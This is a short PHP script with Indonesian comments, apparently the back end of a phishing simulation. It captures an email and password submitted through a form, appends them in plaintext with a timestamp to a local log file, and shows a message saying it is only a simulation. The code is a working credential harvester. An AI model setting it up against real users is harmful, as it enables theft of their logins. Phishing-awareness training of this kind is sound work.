<?php
// Ambil data dari form
$email = $_POST['email'];
$password = $_POST['password'];

// Format data + waktu
$data = "Email: $email | Password: $password | Tanggal: " . date("Y-m-d H:i:s") . "\n";

// Simpan ke file log
file_put_contents("log_simulasi.txt", $data, FILE_APPEND);

// Tampilkan pesan sukses
echo "<h2>Terima kasih! Ini hanya simulasi.</h2>";
?>
